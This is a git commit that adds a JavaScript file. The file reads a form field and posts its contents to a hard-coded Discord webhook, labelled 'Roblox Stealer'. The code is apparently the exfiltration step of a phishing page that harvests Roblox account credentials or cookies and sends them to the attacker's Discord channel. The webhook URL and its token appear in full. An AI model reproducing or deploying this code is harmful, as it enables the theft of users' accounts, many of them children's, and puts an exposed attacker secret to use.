63929d97daad54187faa9ce7a2e1bd4e9b0733d4
Ax3lR3bornAg3ain <152247489+Ax3lR3bornAg3ain@users.noreply.github.com>
2024-06-17 20:03:10 -0700

    Add files via upload

---
+++ script.js
@@ -0,0 +1,28 @@
+function sendMessage() {
+    const content = document.getElementById('content').value;
+
+    const embed = {
+        title: "Roblox Stealer",
+        description: content,
+    };
+
+    const payload = {
+        embeds: [embed],
+    };
+
+    fetch('https://discord.com/api/webhooks/1250234084618276915/fSe7TaYQiqt73J-ubOuexbbXFgqDI97eFvuQqm26Q9HEo3IrR91A8K6fZz69IQdHBk86', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+    })
+    .then(response => {
+        if (!response.ok) {
+            console.error('Failed to send message to Discord');
+        }
+    })
+    .catch(error => {
+        console.error('Error sending message to Discord:', error);
+    });
+}
